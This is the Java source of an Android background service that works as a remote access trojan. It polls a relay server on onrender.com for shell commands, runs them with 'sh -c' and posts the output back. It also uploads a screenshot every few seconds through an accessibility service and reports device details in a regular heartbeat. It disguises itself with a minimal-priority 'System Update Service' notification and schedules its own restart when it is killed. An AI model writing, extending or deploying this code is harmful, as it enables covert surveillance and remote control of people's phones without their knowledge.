package com.xusb.agent;

import android.app.*;
import android.content.*;
import android.os.*;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import org.json.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class AgentService extends Service {

    static final String RELAY = "https://xusb-0c0p.onrender.com";
    static final String TAG   = "XAgent";
    static final String CHANNEL_ID = "xusb_agent";
    static final String PREFS = "xusb_prefs";

    private ExecutorService pool;
    private volatile boolean running = false;
    private static AgentService instance;

    // Screenshot bytes ready to be sent (set by AgentAccessibility callback)
    static volatile byte[] pendingShot = null;

    public static AgentService getInstance() { return instance; }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        pool = Executors.newFixedThreadPool(3);
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundCompat();
        if (!running) {
            running = true;
            pool.submit(this::agentLoop);
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        instance = null;
        super.onDestroy();
        // Restart via alarm
        scheduleRestart();
    }

    // ── Core poll loop ──────────────────────────────────────────────────────────

    private void agentLoop() {
        String did = getDeviceId();
        long lastReg = 0, lastShot = 0;
        int lastCmdId = 0;

        while (running) {
            try {
                long now = System.currentTimeMillis();

                // Heartbeat every 30s
                if (now - lastReg > 30_000) {
                    register(did);
                    lastReg = now;
                }

                // Screenshot every 4s if accessibility enabled
                if (now - lastShot > 4_000) {
                    AgentAccessibility acc = AgentAccessibility.getInstance();
                    if (acc != null) acc.requestShot();
                    // If pendingShot was set by the callback, send it
                    byte[] shot = pendingShot;
                    if (shot != null) {
                        pendingShot = null;
                        postScreenshot(did, shot);
                    }
                    lastShot = now;
                }

                // Poll for command
                JSONObject p = getJson("/esp/device-cmd?did=" + URLEncoder.encode(did, "UTF-8"));
                String cmd = p.optString("cmd", "");
                int cid  = p.optInt("id", 0);
                if (!cmd.isEmpty() && cid != lastCmdId) {
                    lastCmdId = cid;
                    final String finalCmd = cmd;
                    final int finalCid = cid;
                    pool.submit(() -> executeCmd(did, finalCmd));
                }

            } catch (Exception e) {
                Log.d(TAG, "loop: " + e.getMessage());
            }

            try { Thread.sleep(2000); } catch (InterruptedException e) { break; }
        }
    }

    // ── Device identity ─────────────────────────────────────────────────────────

    private String getDeviceId() {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        String did = prefs.getString("did", null);
        if (did == null) {
            did = UUID.randomUUID().toString();
            prefs.edit().putString("did", did).apply();
        }
        return did;
    }

    // ── Register / heartbeat ────────────────────────────────────────────────────

    private void register(String did) throws Exception {
        JSONObject body = new JSONObject();
        body.put("did", did);
        body.put("hostname", Build.MODEL);
        body.put("os", "Android " + Build.VERSION.RELEASE);
        body.put("user", "android");
        body.put("arch", Build.SUPPORTED_ABIS[0]);
        body.put("persistent", true);
        postJson("/esp/device-register", body);
    }

    // ── Execute shell command ───────────────────────────────────────────────────

    private void executeCmd(String did, String cmd) {
        String out;
        if (cmd.equals("__uninstall__")) {
            out = "Uninstalling...";
            try {
                JSONObject body = new JSONObject();
                body.put("did", did);
                body.put("cmd", cmd);
                body.put("out", Base64.encodeToString("Uninstalled".getBytes(), Base64.NO_WRAP));
                body.put("os", "Android " + Build.VERSION.RELEASE);
                postJson("/esp/device-cmdout", body);
            } catch (Exception ignored) {}
            stopSelf();
            return;
        }
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            p.waitFor(30, TimeUnit.SECONDS);
            byte[] stdout = readStream(p.getInputStream(), 16384);
            byte[] stderr = readStream(p.getErrorStream(), 4096);
            byte[] combined = concat(stdout, stderr);
            out = Base64.encodeToString(combined, Base64.NO_WRAP);
        } catch (Exception e) {
            out = Base64.encodeToString(("Error: " + e.getMessage()).getBytes(), Base64.NO_WRAP);
        }
        try {
            JSONObject body = new JSONObject();
            body.put("did", did);
            body.put("cmd", cmd);
            body.put("out", out);
            body.put("os", "Android " + Build.VERSION.RELEASE);
            postJson("/esp/device-cmdout", body);
        } catch (Exception ignored) {}
    }

    // ── Screenshot upload ───────────────────────────────────────────────────────

    void postScreenshot(String did, byte[] imgBytes) {
        try {
            JSONObject body = new JSONObject();
            body.put("did", did);
            body.put("img", Base64.encodeToString(imgBytes, Base64.NO_WRAP));
            body.put("os", "Android " + Build.VERSION.RELEASE);
            postJson("/esp/device-screenshot", body);
        } catch (Exception ignored) {}
    }

    // ── HTTP helpers ────────────────────────────────────────────────────────────

    private JSONObject getJson(String path) throws Exception {
        URL url = new URL(RELAY + path);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setConnectTimeout(8000);
        c.setReadTimeout(8000);
        try {
            byte[] body = readStream(c.getInputStream(), 65536);
            return new JSONObject(new String(body));
        } finally { c.disconnect(); }
    }

    private void postJson(String path, JSONObject data) throws Exception {
        URL url = new URL(RELAY + path);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/json");
        c.setDoOutput(true);
        c.setConnectTimeout(15000);
        c.setReadTimeout(15000);
        try (OutputStream os = c.getOutputStream()) {
            os.write(data.toString().getBytes());
        }
        try { c.getInputStream().close(); } catch (Exception ignored) {}
        finally { c.disconnect(); }
    }

    private byte[] readStream(InputStream is, int max) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n;
        int total = 0;
        while ((n = is.read(buf)) != -1) {
            baos.write(buf, 0, n);
            total += n;
            if (total >= max) break;
        }
        return baos.toByteArray();
    }

    private byte[] concat(byte[] a, byte[] b) {
        byte[] result = new byte[a.length + b.length];
        System.arraycopy(a, 0, result, 0, a.length);
        System.arraycopy(b, 0, result, a.length, b.length);
        return result;
    }

    // ── Notification ────────────────────────────────────────────────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.enableLights(false);
            ch.enableVibration(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
    }

    private void startForegroundCompat() {
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update Service")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
        startForeground(1, n);
    }

    // ── Restart alarm ───────────────────────────────────────────────────────────

    private void scheduleRestart() {
        Intent i = new Intent(this, BootReceiver.class);
        i.setAction("com.xusb.agent.RESTART");
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (am != null)
            am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pi);
    }
}
